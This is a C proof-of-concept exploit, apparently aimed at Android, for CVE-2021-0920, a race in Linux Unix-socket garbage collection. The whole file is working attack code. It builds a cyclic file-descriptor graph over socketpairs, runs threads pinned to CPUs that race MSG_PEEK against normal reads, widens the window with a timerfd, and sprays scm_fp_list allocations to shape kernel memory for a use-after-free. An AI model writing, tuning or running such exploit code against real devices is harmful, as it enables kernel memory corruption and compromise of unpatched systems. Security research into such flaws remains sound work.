#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/eventfd.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <sched.h>
#include <errno.h>
#include <stdbool.h>
#include <stdarg.h>
#include <time.h>

volatile bool stop_race = false;
FILE* logfile = NULL;
int R[2], B[2], C[2], D[2];
int spray_sv[32][2];
int spray_efds[4];
int tfd; // Глобальный timerfd

void log_msg(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf("\n");
    if (logfile) {
        va_start(args, fmt);
        vfprintf(logfile, fmt, args);
        va_end(args);
        fprintf(logfile, "\n");
        fflush(logfile);
    }
}

void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    sendmsg(socket, &msg, 0);
}

int recv_fd(int socket, int flags) {
    struct msghdr msg = {0};
    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    if (recvmsg(socket, &msg, flags | MSG_DONTWAIT) < 0) return -1;
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
        int fd;
        memcpy(&fd, CMSG_DATA(cmsg), sizeof(int));
        return fd;
    }
    return -1;
}

// Поток 1: MSG_PEEK (получает дескрипторы B и C)
void* peek_thread(void* arg) {
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(0, &set); sched_setaffinity(0, sizeof(set), &set);
    long iter = 0;
    while (!stop_race) {
        int b_fd = recv_fd(R[1], MSG_PEEK);
        if (b_fd >= 0) {
            int c_fd = recv_fd(b_fd, MSG_PEEK);
            if (c_fd >= 0) close(c_fd);
            close(b_fd);
        }
        iter++;
        if (iter % 10000 == 0) log_msg("[*] Peek iterations: %ld", iter);
    }
    return NULL;
}

// Поток 2: Обычное чтение B с использованием timerfd для расширения окна
void* read_thread(void* arg) {
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(0, &set); sched_setaffinity(0, sizeof(set), &set); // Тот же CPU, что и peek!

    long iter = 0;
    while (!stop_race) {
        int b_fd = recv_fd(R[1], MSG_PEEK);
        if (b_fd >= 0) {
            // Взводим таймер на очень короткое время, чтобы прерывание попало в критическую секцию
            struct itimerspec its;
            its.it_value.tv_sec = 0;
            its.it_value.tv_nsec = 10000; // 10 мкс (нужно калибровать!)
            its.it_interval.tv_sec = 0;
            its.it_interval.tv_nsec = 0;
            timerfd_settime(tfd, TFD_TIMER_ABSTIME, &its, NULL);

            recv_fd(b_fd, 0); // Обычное чтение B
            close(b_fd);
        }
        iter++;
        if (iter % 10000 == 0) log_msg("[*] Read iterations: %ld", iter);
    }
    return NULL;
}

// Поток 3: Спрей scm_fp_list и нагрузка на GC
void* spray_gc_thread(void* arg) {
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(2, &set); sched_setaffinity(0, sizeof(set), &set);
    
    // Настраиваем спрей
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int) * 4)];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int) * 4);
    memcpy(CMSG_DATA(cmsg), spray_efds, sizeof(int) * 4);

    while (!stop_race) {
        // Спрей scm_fp_list (по 4 fd за сообщение)
        for (int i = 0; i < 32; i++) {
            sendmsg(spray_sv[i][0], &msg, MSG_DONTWAIT);
        }
        
        // Нагрузка на GC
        int t1[2], t2[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, t1) == 0 && socketpair(AF_UNIX, SOCK_STREAM, 0, t2) == 0) {
            send_fd(t1[0], t2[0]);
            send_fd(t2[0], t1[0]);
            close(t1[0]); close(t2[0]); close(t1[1]); close(t2[1]);
        }
        usleep(10);
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    logfile = fopen("/data/local/tmp/race_v16.log", "w");
    log_msg("[*] CVE-2021-0920 Race PoC v16 (Calibrated Timer)");

    // Создаем timerfd
    tfd = timerfd_create(CLOCK_MONOTONIC, 0);

    // Создаем сокеты
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, R) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, B) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, C) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, D) < 0) {
        log_msg("[-] socketpair failed");
        return 1;
    }

    // Создаем сокеты для спрея
    for (int i = 0; i < 32; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray_sv[i]) < 0) return 1;
    }
    for (int i = 0; i < 4; i++) {
        spray_efds[i] = eventfd(0, 0);
    }
    log_msg("[+] Spray sockets initialized.");

    // Строим граф
    send_fd(R[0], B[1]);
    send_fd(B[0], C[1]);
    send_fd(C[0], D[1]);
    send_fd(D[0], C[1]);

    // Закрываем исходные дескрипторы
    close(R[0]); close(B[0]); close(C[0]); close(D[0]);

    log_msg("[+] Graph created. Starting threads...");

    pthread_t t_peek, t_read, t_spray;
    pthread_create(&t_peek, NULL, peek_thread, NULL);
    pthread_create(&t_read, NULL, read_thread, NULL);
    pthread_create(&t_spray, NULL, spray_gc_thread, NULL);

    // Работаем 5 минут
    sleep(300);
    stop_race = true;

    pthread_join(t_peek, NULL);
    pthread_join(t_read, NULL);
    pthread_join(t_spray, NULL);

    log_msg("[-] PoC finished without panic.");
    if (logfile) fclose(logfile);
    return 0;
}